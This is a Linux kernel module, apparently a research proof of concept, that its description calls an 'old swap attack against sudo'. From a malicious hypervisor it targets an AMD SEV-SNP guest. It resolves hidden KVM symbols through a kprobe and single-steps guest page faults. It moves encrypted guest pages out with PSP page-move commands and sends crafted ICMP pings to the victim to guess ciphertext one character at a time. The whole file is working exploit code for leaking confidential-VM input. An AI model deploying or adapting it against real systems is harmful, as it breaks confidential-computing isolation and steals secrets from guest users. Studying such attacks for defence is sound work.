#define pr_fmt(fmt) "%s:%s: " fmt, KBUILD_MODNAME, __func__

#define ICMP_DATA_PAGE 0x1a91000
#define MARKER_PAGE 0x1a95000

#define VICTIM_PAGE 0x10e05000
#define USERSPACE_MARKER 0x106bd000

#define OFFSET_LINE_BUFFER 0xce0

#define CHARS_TO_LEAK 1

#include <asm/cpu.h>
#include <asm/io.h>
#include <asm/pgtable_types.h>
#include <asm/processor.h>
#include <asm/sev-common.h>
#include <asm/sev.h>
#include <asm/svm.h>
#include <asm/tdx.h>
#include <kvm/iodev.h>
#include <linux/anon_inodes.h>
#include <linux/bitops.h>
#include <linux/bits.h>
#include <linux/cdev.h>
#include <linux/compat.h>
#include <linux/cpu.h>
#include <linux/cpumask.h>
#include <linux/debugfs.h>
#include <linux/delay.h>
#include <linux/device.h>
#include <linux/errno.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/gfp.h>
#include <linux/highmem.h>
#include <linux/hugetlb.h>
#include <linux/icmp.h>
#include <linux/if_link.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/ioctl.h>
#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/kvm.h>
#include <linux/kvm_host.h>
#include <linux/kvm_types.h>
#include <linux/miscdevice.h>
#include <linux/mm.h>
#include <linux/mman.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/netdevice.h>
#include <linux/percpu.h>
#include <linux/profile.h>
#include <linux/psp-sev.h>
#include <linux/psp.h>
#include <linux/rcupdate.h>
#include <linux/reboot.h>
#include <linux/sched/mm.h>
#include <linux/sched/signal.h>
#include <linux/sched/stat.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/smp.h>
#include <linux/socket.h>
#include <linux/spinlock.h>
#include <linux/srcu.h>
#include <linux/string.h>
#include <linux/swap.h>
#include <linux/syscore_ops.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/vmalloc.h>
#include <net/icmp.h>
#include <net/ip.h>
#include <net/sock.h>

#include "protect.h"
#include "swap.h"

#define VICTIM_IP "192.168.122.78"

#define BYTES_PER_LINE 16

struct kvm *get_kvm_by_pid(pid_t pid);

extern bool debug_page_faults;
extern bool kvm_vcpu_read_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn);
extern bool kvm_vcpu_write_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn);
extern bool kvm_vcpu_exec_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn,
                                      bool flush_tlb);
extern atomic_long_t stop_at_fault_address;
extern atomic_long_t stopped_at;

extern atomic_t stop_at_fault;
extern atomic_t can_continue;
extern atomic_t continued;
extern struct mutex continue_mutex;

static u64 __maybe_unused rmpupdate_pre_guest(u64 paddr, u32 asid) {
    struct rmp_state state = {0};
    u64 ret;

    state.assigned = 1;
    state.pagesize = 0;
    state.immutable = 1;
    state.asid = asid;

    do {
        /* Binutils version 2.36 supports the RMPUPDATE mnemonic. */
        asm volatile(".byte 0xF2, 0x0F, 0x01, 0xFE"
                     : "=a"(ret)
                     : "a"(paddr), "c"((unsigned long)&state)
                     : "memory", "cc");
    } while (ret == RMPUPDATE_FAIL_OVERLAP);

    return ret;
}

static u64 __maybe_unused rmpupdate_pre_swap(u64 paddr, u64 gpa, u32 asid) {
    struct rmp_state state = {0};
    u64 ret;

    state.assigned = 1;
    state.pagesize = 0;
    state.immutable = 1;
    state.gpa = gpa;
    state.asid = asid;

    do {
        /* Binutils version 2.36 supports the RMPUPDATE mnemonic. */
        asm volatile(".byte 0xF2, 0x0F, 0x01, 0xFE"
                     : "=a"(ret)
                     : "a"(paddr), "c"((unsigned long)&state)
                     : "memory", "cc");
    } while (ret == RMPUPDATE_FAIL_OVERLAP);

    return ret;
}

static void __maybe_unused hexdump(const void *addr, size_t len) {
    const unsigned char *ptr = addr;
    size_t i, j;

    for (i = 0; i < len; i += BYTES_PER_LINE) {
        printk(KERN_INFO "%08lx: ", (unsigned long)(ptr + i));
        for (j = 0; j < BYTES_PER_LINE; j++) {
            if (i + j < len)
                printk(KERN_CONT "%02x ", ptr[i + j]);
            else
                printk(KERN_CONT "   ");
        }

        printk(KERN_CONT " | \n");
    }
}

#define KPROBE_KALLSYMS_LOOKUP

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

kallsyms_lookup_name_t kallsyms_lookup_name_func;
#define kallsyms_lookup_name kallsyms_lookup_name_func

static struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};

int (*interruptfunc)(struct kvm_lapic *apic, int delivery_mode, int trig_mode,
                     int vector);

u64 *(*get_sptep)(struct kvm_vcpu *vcpu, gfn_t gfn, u64 *spte);

// The function needs the attribute __attribute__((__noinline__)) to avoid the
// compiler optimization
void (*__handle_changed_spte)(struct kvm *kvm, int as_id, gfn_t gfn,
                              u64 old_spte, u64 new_spte, int level,
                              bool shared);

bool (*__mmu_spte_update)(u64 *sptep, u64 new_spte);

void (*__tdp_iter_start)(struct tdp_iter *iter, struct kvm_mmu_page *root,
                         int min_level, gfn_t next_last_level_gfn);

void (*__dump_rmpentry)(u64 pfn);

bool (*__kvm_unmap_gfn_range)(struct kvm *kvm, struct kvm_gfn_range *range);

int (*__snp_page_reclaim)(struct kvm *kvm, u64 pfn);

struct list_head *_vm_list;
struct rmpentry *__rmptable;

static int init(void) {

#ifdef KPROBE_KALLSYMS_LOOKUP
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    if (!unlikely(kallsyms_lookup_name)) {
        pr_alert("Could not retrieve kallsyms_lookup_name address\n");
        return -ENXIO;
    }
#endif

    _vm_list = (void *)kallsyms_lookup_name("vm_list");
    if (_vm_list == NULL) {
        pr_info("lookup failed vm_list\n");
        return -ENXIO;
    }
    get_sptep =
        (void *)kallsyms_lookup_name("kvm_tdp_mmu_fast_pf_get_last_sptep");
    if (get_sptep == NULL) {
        pr_info("lookup failed get_sptep\n");
        return -ENXIO;
    }
    __dump_rmpentry = (void *)kallsyms_lookup_name("dump_rmpentry");
    if (__dump_rmpentry == NULL) {
        pr_info("lookup failed dump_rmpentry\n");
        return -ENXIO;
    }
    __rmptable = (void *)kallsyms_lookup_name("rmptable");
    if (__rmptable == NULL) {
        pr_info("lookup failed __rmptable\n");
        return -ENXIO;
    }
    __snp_page_reclaim = (void *)kallsyms_lookup_name("snp_page_reclaim");
    if (__snp_page_reclaim == NULL) {
        pr_info("lookup failed __snp_page_reclaim\n");
        return -ENXIO;
    }
    __handle_changed_spte = (void *)kallsyms_lookup_name("handle_changed_spte");
    if (__handle_changed_spte == NULL) {
        pr_info("lookup failed __handle_changed_spte\n");
        return -ENXIO;
    }
    __mmu_spte_update = (void *)kallsyms_lookup_name("mmu_spte_update");
    if (__mmu_spte_update == NULL) {
        pr_info("lookup failed __mmu_spte_update\n");
        return -ENXIO;
    }
    __tdp_iter_start = (void *)kallsyms_lookup_name("tdp_iter_start");
    if (__tdp_iter_start == NULL) {
        pr_info("lookup failed __tdp_iter_start\n");
        return -ENXIO;
    }
    __kvm_unmap_gfn_range = (void *)kallsyms_lookup_name("kvm_unmap_gfn_range");
    if (__kvm_unmap_gfn_range == NULL) {
        pr_info("lookup failed __kvm_unmap_gfn_range\n");
        return -ENXIO;
    }

    return 0;
}

static int protect_page(struct kvm_vcpu *vcpu, int protection,
                        uint64_t guest_frame) {
    if (!vcpu) {
        pr_info("Unable to get vcpu* for this kvm/vcpuid");
        return -EINVAL;
    }

    switch (protection) {
    case PERM_R:

        // pr_info("protecting gfn=%lx from read, vcpu is %llx\n",
        // guest_frame, vcpu);
        kvm_vcpu_read_protect_gfn(vcpu, guest_frame);

        break;

    case PERM_W:

        // pr_info("protecting gfn=%lx from write, vcpu is %llx\n",
        // guest_frame, vcpu);
        kvm_vcpu_write_protect_gfn(vcpu, guest_frame);

        break;

    case PERM_X:
        // pr_info("protecting gfn=%lx from execute\n", guest_frame);
        kvm_vcpu_exec_protect_gfn(vcpu, guest_frame, true);
        break;

    default:
        pr_info("no such protection or not implemented");
        return -EINVAL;
    }

    return 0;
}

static uint16_t icmp_checksum(uint16_t *buf, int len) {
    uint32_t sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(uint8_t *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

static int ping(int sequence, char *payload, size_t payload_len) {
    struct socket *sock;
    struct sockaddr_in daddr;
    struct msghdr msg;
    struct kvec iov;
    struct icmphdr icmp;
    // char payload[32] = "ping from kernel module";
    size_t packet_size = sizeof(struct icmphdr) + payload_len;
    char *packet = kzalloc(packet_size, GFP_KERNEL);
    int ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_ICMP, &sock);
    if (ret < 0) {
        printk(KERN_ERR "sock_create_kern failed: %d\n", ret);
        return ret;
    }

    memset(&icmp, 0, sizeof(icmp));
    icmp.type = ICMP_ECHO;
    icmp.code = 0;
    icmp.un.echo.id = htons(1234);
    icmp.un.echo.sequence = htons(sequence);

    memcpy(packet, &icmp, sizeof(icmp));
    memcpy(packet + sizeof(icmp), payload, payload_len);

    ((struct icmphdr *)packet)->checksum =
        icmp_checksum((uint16_t *)packet, packet_size);

    memset(&daddr, 0, sizeof(daddr));
    daddr.sin_family = AF_INET;
    daddr.sin_addr.s_addr = in_aton(VICTIM_IP);

    memset(&msg, 0, sizeof(msg));
    msg.msg_name = &daddr;
    msg.msg_namelen = sizeof(daddr);

    iov.iov_base = packet;
    iov.iov_len = packet_size;

    ret = kernel_sendmsg(sock, &msg, &iov, 1, iov.iov_len);

    if (ret < 0) {
        printk(KERN_ERR "kernel_sendmsg failed: %d\n", ret);
    }
    sock_release(sock);
    kfree(packet);
    return 0;
}

static u64 hpa_for_gpa(u64 gpa, struct kvm_vcpu *vcpu) {
    u64 spte;
    u64 *sptep;
    rcu_read_lock();
    sptep = get_sptep(vcpu, gpa >> PAGE_SHIFT, &spte);
    rcu_read_unlock();

    return spte & 0x0000FFFFFFFFF000ULL;
}

struct psp_sev_cmd_move {
    u64 guest_physical_addr;
    u32 page_size : 1;
    u32 reserved : 31;
    u32 reserved1;
    u64 src_paddr;
    u64 dst_paddr;
} __packed;

static int __maybe_unused psp_move_page(struct kvm *kvm, u64 hpa_src,
                                        u64 gpa_src, u64 hpa_dst) {
    struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
    struct psp_sev_cmd_move data = {0};
    u32 error = 0;
    int ret;

    rmpupdate_pre_swap(hpa_src, gpa_src, sev->asid);
    rmpupdate_pre_guest(hpa_dst, sev->asid);

    data.guest_physical_addr = __psp_pa(sev->snp_context);
    data.page_size = 0;
    data.src_paddr = (hpa_src);
    data.dst_paddr = (hpa_dst);

    // pr_info("hpa_src %llx ->, hpa_dst %llx\n", hpa_src, hpa_dst);
    // pr_info("snp_context %llx\n", (u64)sev->snp_context);
    // pr_info("gctx_paddr %llx\n", gctx_paddr);

    ret = sev_do_cmd(SEV_CMD_SNP_PAGE_MOVE, &data, &error);

    if (ret != 0) {
        pr_info("page move error value 0x%x\n", error);
        pr_info("page move ret value 0x%x\n", ret);
    }

    return ret;
}

// guess must be char[16]
static void ping_for_guess(char *guess) {
    char *payload = kmalloc(8900, GFP_KERNEL);
    memset(payload, 0xdf, 8900);
    payload[0] = 'x';
    payload[1] = 'y';

    for (size_t i = 0; i < 554; i++) {
        memcpy(payload + 10 + 16 * i, guess, 16);
    }

    ping(101, payload, 8900);
}

static struct list_head *i;
static struct kvm_vcpu *vcpu;
static struct kvm *kvm = NULL;

void protect_gpa(u64 gpa) {
    atomic_xchg(&stop_at_fault, 1);
    protect_page(vcpu, PERM_W, gpa >> PAGE_SHIFT);
    protect_page(vcpu, PERM_R, gpa >> PAGE_SHIFT);

    atomic_xchg(&can_continue, 0);
    atomic_long_xchg(&stop_at_fault_address, gpa);
}

u64 step_pf(u64 gpa, u64 timeout_ns) {
    protect_gpa(gpa);

    u64 start_time = ktime_get_ns();
    u64 stopped_at_val = 0;

    if (timeout_ns > 0) {
        while (((stopped_at_val = atomic_long_read(&stopped_at)) == 0) &&
               (ktime_get_ns() - start_time) < timeout_ns)
            ;
        if (stopped_at_val == 0) {
            pr_warn("timeout ellapsed, did not fault\n");
        }
    }
    atomic_long_xchg(&stopped_at, 0);
    return stopped_at_val;
}

void continue_vm(u64 timeout_ms) {
    atomic_xchg(&can_continue, 1);
    u64 start_time = ktime_get_ns();
    u64 continued_val = 0;

    if (timeout_ms > 0) {
        while (((continued_val = atomic_read(&continued)) == 0) &&
               (ktime_get_ns() - start_time) < timeout_ms * 1000000)
            ;
        if (continued_val == 0) {
            pr_warn("timeout ellapsed, did not continue\n");
        }
    }

    atomic_long_xchg(&stopped_at, 0);
    mdelay(10);
}

static char ascii_occurences[] = {
    32,  101, 116, 97,  110, 105, 111, 115, 114, 108, 100, 104, 99,  10, 117,
    109, 112, 102, 103, 46,  121, 98,  119, 44,  118, 48,  107, 49,  83, 84,
    67,  50,  56,  53,  65,  57,  120, 51,  73,  45,  54,  52,  55,  77, 66,
    34,  39,  80,  69,  78,  70,  82,  68,  85,  113, 76,  71,  74,  72, 79,
    87,  106, 122, 47,  60,  62,  75,  41,  40,  86,  89,  58,  81,  90, 88,
    59,  63,  127, 94,  38,  43,  91,  93,  33,  36,  42,  61,  126, 9,  95,
    30,  27,  5,   64,  123, 35,  37,  92,  96,  124, 125, 13,  11,  12, 'I'};

#define DUMP_RMP(hpa)                                                          \
    {                                                                          \
        pr_info("RMP ENTRY for %s\n", #hpa);                                   \
        __dump_rmpentry(hpa >> PAGE_SHIFT);                                    \
    }

static char collected_ciphertexts[CHARS_TO_LEAK][16];
void *hypervisor_page;
// EXPORT_SYMBOL(hypervisor_page);

static int __init protect_module_init(void) {
    int ret = init();
    if (ret != 0) {
        pr_info("init failed!\n");
        return ret;
    }

    list_for_each(i, _vm_list) {
        kvm = list_entry(i, struct kvm, vm_list);

        pr_info("kvm location %p\n", kvm);

        if (atomic_read(&kvm->online_vcpus) == 0) {
            printk(KERN_INFO "no vcpus are online %d\n",
                   atomic_read(&kvm->online_vcpus));
            return -1;
        }
        vcpu = xa_load(&kvm->vcpu_array, 0);
    }
    if (!kvm) {
        pr_info("kvm object not found\n");
        return -1;
    }

    u64 hpa_victim = hpa_for_gpa(VICTIM_PAGE, vcpu);

    if (!hypervisor_page)
        hypervisor_page = (void *)__get_free_page(GFP_KERNEL);

    u64 hypervisor_page_hpa = virt_to_phys(hypervisor_page);
    pr_info("Hypervisor page hpa %llx\n", hypervisor_page_hpa);

    char *victim_page = phys_to_virt(hpa_victim);

    if (!victim_page) {
        pr_info("Unable to map victim page\n");
        return -EINVAL;
    }
    if (!hypervisor_page) {
        pr_info("Unable to map hypervisor page\n");
        return -EINVAL;
    }

    u64 total_time_input = 0, total_time_guessing, start_time;
    u64 guessing_delay = 0, start_2;
    for (size_t collected_ctxt_idx = 0; collected_ctxt_idx < CHARS_TO_LEAK;
         collected_ctxt_idx++) {
        pr_info("Protecting Userspace Marker\n");
        if (!step_pf(USERSPACE_MARKER, 10000000000)) {
            pr_warn("Could not hit userspace marker");
            return -1;
        }
        // pr_info("Hit userspace marker\n");
        start_time = ktime_get_ns();

        psp_move_page(kvm, hpa_victim, VICTIM_PAGE, hypervisor_page_hpa);

        memcpy(collected_ciphertexts[collected_ctxt_idx],
               hypervisor_page + OFFSET_LINE_BUFFER, 16);

        hexdump(collected_ciphertexts[collected_ctxt_idx], 16);

        psp_move_page(kvm, hypervisor_page_hpa, VICTIM_PAGE, hpa_victim);

        continue_vm(1500);
        total_time_input += (ktime_get_ns() - start_time);
    }

    char correct_guesses[16] = {0};

    start_time = ktime_get_ns();
    for (size_t collected_ctxt_idx = 0; collected_ctxt_idx < CHARS_TO_LEAK;
         collected_ctxt_idx++) {
        bool done = false;
        for (size_t g_index = 0; g_index < 105 && !done; g_index++) {
            for (size_t i = 0; i < 2 && !done; i++) {
                char g = ascii_occurences[g_index];

                pr_info("guess is %c, %hhx", g, g);

                char guess[16] = {0};
                memset(guess, 0, 16);
                memcpy(guess, correct_guesses, collected_ctxt_idx);
                guess[collected_ctxt_idx] = g;
                guess[collected_ctxt_idx + 1] = 0;

                protect_gpa(MARKER_PAGE);

                // size_t j;
                // for (j = 0; j < 10; j++) {
                ping_for_guess(guess);
                mdelay(10);
                u64 stopped_at_val, start_time = ktime_get_ns();

                while (
                    ((stopped_at_val = atomic_long_read(&stopped_at)) == 0) &&
                    (ktime_get_ns() - start_time) < 200000)
                    ;

                start_2 = ktime_get_ns();
                if (stopped_at_val != 0) {
                    pr_info("did fault at %llx, marker at %llx\n",
                            stopped_at_val, MARKER_PAGE);
                    // break;
                } else {
                    pr_info("did not fault\n");
                    continue;
                }
                // }

                //            if (j == 10) {
                //                pr_info("could not fault\n");
                //                // return -1;
                // continue;
                //            }

                u64 hpa_data = hpa_for_gpa(ICMP_DATA_PAGE, vcpu);

                psp_move_page(kvm, hpa_data, ICMP_DATA_PAGE,
                              hypervisor_page_hpa);

                hexdump(hypervisor_page + OFFSET_LINE_BUFFER, 16);
                if (memcmp(collected_ciphertexts[collected_ctxt_idx],
                           hypervisor_page + OFFSET_LINE_BUFFER, 16) == 0) {
                    pr_info("Correct guess is %hhx\n", g);
                    done = true;
                    correct_guesses[collected_ctxt_idx] = g;
                }
                psp_move_page(kvm, hypervisor_page_hpa, ICMP_DATA_PAGE,
                              hpa_data);

                continue_vm(1500);
                guessing_delay += (ktime_get_ns() - start_2);
                mdelay(10);
            }
        }

        if (correct_guesses[collected_ctxt_idx] == 0) {
            return -1;
        }
    }

    total_time_guessing = (ktime_get_ns() - start_time);

    pr_info("leaked input: %s\n", correct_guesses);
    pr_info("Delayed VM an average of %llu ms per char\n",
            (total_time_input / 1000000) / CHARS_TO_LEAK);

    pr_info("Guessing took an average of %llu ms per char\n",
            (total_time_guessing / 1000000L) / CHARS_TO_LEAK);

    pr_info("A total of %llu ms\n", (total_time_guessing / 1000000L));

    pr_warn("Which delayed the vm another %llu ms in total\n",
            (guessing_delay / 1000000));

    return -1;
}

// Module cleanup
static void __exit protect_module_exit(void) {
    pr_info("toggle_flag module unloaded\n");
}

module_init(protect_module_init);
module_exit(protect_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("chriswe");
MODULE_DESCRIPTION("old swap attack against sudo");
